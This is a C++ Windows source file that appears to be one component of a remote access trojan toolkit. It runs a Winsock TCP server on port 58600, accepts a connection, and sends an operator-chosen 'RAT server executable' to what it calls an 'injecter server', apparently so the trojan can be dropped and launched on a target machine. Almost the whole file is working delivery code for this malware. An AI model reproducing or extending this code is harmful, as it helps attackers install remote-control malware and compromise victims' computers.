#undef UNICODE
#define WIN32_LEAN_AND_MEAN

//By Marc-Antoine Plourde
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <cstdlib> 
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <string>

#pragma warning(disable:4996) //For allowing the compilation because the "fopen" method is considered "unsafe".

using namespace std;

// Need to link with Ws2_32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")

#define BUFFLEN_SHORT_MESSAGE 256
#define DEFAULT_BUFLEN 512
#define BUFLEN_FILE 1000000
#define INJECTER_PORT "58600"

bool SendShortMessage(SOCKET &socket, string shortMessage)
{

	int iResult;
	int shortMessageSize = (int)strlen(shortMessage.c_str());
	bool sentSuccessfully = true;

	//Sending the short message
	iResult = send(socket, shortMessage.c_str(), (shortMessageSize + 1), 0);

	if (iResult == SOCKET_ERROR)
	{

		cout << "send failed with error: " << WSAGetLastError() << "\n";

		sentSuccessfully = false;

	}
	else
	{

		cout << "send ran successfully" << "\n";

	}

	return sentSuccessfully;

}

string RecvShortMessage(SOCKET &socket)
{

	bool done = false;
	int cumul = 0;
	int iResult;
	char shortMessageBuf[BUFFLEN_SHORT_MESSAGE];
	string shortMessage = "";

	while (!done)//Checking that the received message is containing all the characters.
	{

		//To receive the message
		iResult = recv(socket, &shortMessageBuf[0], BUFFLEN_SHORT_MESSAGE, 0);
		if (iResult == SOCKET_ERROR)
		{

			cout << "recv failed with error: " << WSAGetLastError() << "\n";//recv error

			closesocket(socket);

			WSACleanup();

			return shortMessage;

		}
		else
			if (iResult>0)
			{

				for (int i = cumul; i < (cumul + iResult); i++)
				{

					if (shortMessageBuf[i] == '\0')//the message was completly received 
					{

						done = true;

						for (int x = 0; x < i; x++)//copy the message in the buff into the string
						{

							shortMessage += shortMessageBuf[x];

						}

						i = (cumul + iResult);

					}

				}

			}
			else
			{

				done = true;
				int i = 0;

				while (shortMessageBuf[i] != 'Ì')
				{

					shortMessage += shortMessageBuf[i];

					i++;

				}

			}

		cumul = iResult;

	}

	return shortMessage;

}

int SendFile(SOCKET &socket, string filePath)//return 0 if ran successfully. Otherwise, it returns a value > 0 for error management.
{

	int iResult;
	FILE* file = fopen(filePath.c_str(), "rb");
	//To check is the file exist.
	if (file != NULL)
	{


		//Get the file size
		fseek(file, 0, SEEK_END);
		int fileSize = ftell(file);
		rewind(file);


		string fileSizeString = to_string(fileSize);//put the file's size in a c++ string
		string serverAnswer = "";//0 if received, not received if it's another value

		SendShortMessage(socket, fileSizeString);
		
		if ((serverAnswer = RecvShortMessage(socket)) != "0")
		{

			cout << "An error occured while sending the file's size to the server" << "\n";

			return 1;

		}

		//Send the file
		char *fileBuf = (char*)malloc(sizeof(char) * fileSize);//Allocate a memory block of the file's size to the pointer.
		if (fileBuf == NULL)
		{

			cout << "Program's buffer memory allocation failed." << endl;

			return 1;

		}
		else
		{

			cout << "Program's buffer memory allocated successfully" << endl;
		
		}

		size_t size;
		size = fread(fileBuf, 1, fileSize, file);
		if (size != fileSize) //Check if there is no reading error.
		{
			cout << "File reading failed" << endl;

			return 1;
		}
		else
		{

			cout << "Program readed successfully" << endl;
			iResult = send(socket, fileBuf, fileSize, 0);
			if (iResult == SOCKET_ERROR) {
				cout << "Send program failed with error: " << WSAGetLastError() << endl;
				closesocket(socket);
				WSACleanup();
				return 1;
			}
			else
			{
				cout << "Program sent successfully." << endl;
			}
		}


	}
	else
	{

		cout << "Unable to open the file" << "\n";

		return 1;

	}

	return 0;

}


void main()
{
	WSADATA wsaData;  //  WSA stands for "Windows Socket API"
	int iResult;

	SOCKET ListenSocket = INVALID_SOCKET;
	SOCKET ServerSocket = INVALID_SOCKET;

	struct addrinfo *result = NULL;
	struct addrinfo hints;

	int iSendResult;
	char injectedProgramNameRecvBuf[DEFAULT_BUFLEN];
	int fileNameRecvBufLen = DEFAULT_BUFLEN;


	/*
	The files must be with the .exe program. GetModuleFileName put the file path of the current .exe file.
	So the program will put the buffer's content into a string and after that, it will remove the "server.exe" and replace it with the requested file name

	*/
	char actualProgramFilePathBuf[MAX_PATH];
	GetModuleFileNameA(NULL, actualProgramFilePathBuf, MAX_PATH);
	string injectedProgramFilePath = "";
	const string actualProgramName = "InjecterServer.exe";

	//Put the file path of the .exe into a string
	int z = 0;
	while (actualProgramFilePathBuf[z] != '\0')
	{
		injectedProgramFilePath += actualProgramFilePathBuf[z];
		z++;
	}

	//Delete the program's name of the string to get the only the file path
	//The injected program will download at the same place that this program, so the file path will be used later to launch the injected program. 
	for (int i = 0; i < actualProgramName.length(); i++)
	{
		injectedProgramFilePath.pop_back();
	}






	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		cout << "WSAStartup failed with error: " << iResult << endl;
		return;
	}
	else
	{
		cout << "WSAStartup ran successfully." << endl;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;  // Address Format Internet
	hints.ai_socktype = SOCK_STREAM;  //  Provides sequenced, reliable, two-way, connection-based byte streams
	hints.ai_protocol = IPPROTO_TCP;  // Indicates that we will use TCP
	hints.ai_flags = AI_PASSIVE;  // Indicates that the socket will be passive => suitable for bind()

								  // Resolve the server address and port
								  //       => defines port number and gets local IP address (in "result" struct)
	iResult = getaddrinfo(NULL, INJECTER_PORT, &hints, &result);
	if (iResult != 0) {
		cout << "getaddrinfo failed with error: " << iResult << endl; //getaddrinfo error.
		WSACleanup();
		return;
	}
	else
	{
		cout << "getaddrinfo ran successfully." << endl; //getaddrinfo ran successfuly
	}

	// Create a SOCKET for connecting to server
	//     (note that we could have defined the 3 socket parameter using "hints"...)
	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (ListenSocket == INVALID_SOCKET) {
		cout << "socket failed with error: " << WSAGetLastError() << endl; //Socket error.
		freeaddrinfo(result);
		WSACleanup();
		return;
	}
	else
	{
		cout << "socket ran successfully." << endl; //Socket is ok.
	}

	// Setup the TCP listening socket
	//     (for "bind()", we need the info returned by "getaddrinfo()")
	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	// Note:  "ai_addr" is a struct containing IP address and port
	if (iResult == SOCKET_ERROR) {
		cout << "bind failed with error: " << WSAGetLastError() << endl; //Bind error
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		return;
	}
	else
	{
		cout << "bind ran successfully." << endl; //Bind is ok
	}

	freeaddrinfo(result);

	// define the maximum number of connections
	iResult = listen(ListenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		cout << "listen failed with error: " << WSAGetLastError() << endl; //Listen error
		closesocket(ListenSocket);
		WSACleanup();
		return;
	}
	else
	{
		cout << "listening..." << endl; //Listen is ok
	}


	// Accept a client socket
	//   Notes:
	//          1- "accept()" is a blocking function
	//          2- It returns a new socket of the connection
	ServerSocket = accept(ListenSocket, NULL, NULL);
	if (ServerSocket == INVALID_SOCKET) {
		cout << "accept failed with error: " << WSAGetLastError() << endl; //Accept failed.
		closesocket(ListenSocket);
		WSACleanup();
		return;
	}
	else
	{
		cout << "accept ran successfully." << endl << "The client is connected to server." << endl; //Accept is ok.
		

		string path;
		cout << endl<<"Enter the file path of the RAT server executable (don't forget the \".exe\": ";
		cin >> path;
		cout << endl;


		if (SendFile(ServerSocket, path) == 1)
		{

			cout << "An error occured while sending the RAT server to the injecter server" << endl;

		}
		else
		{
			
			cout << "The RAT server executable file was sent successfully to the injecter server" << endl;

		}

		closesocket(ServerSocket);
		WSACleanup();

	}

	system("pause");
	return;
}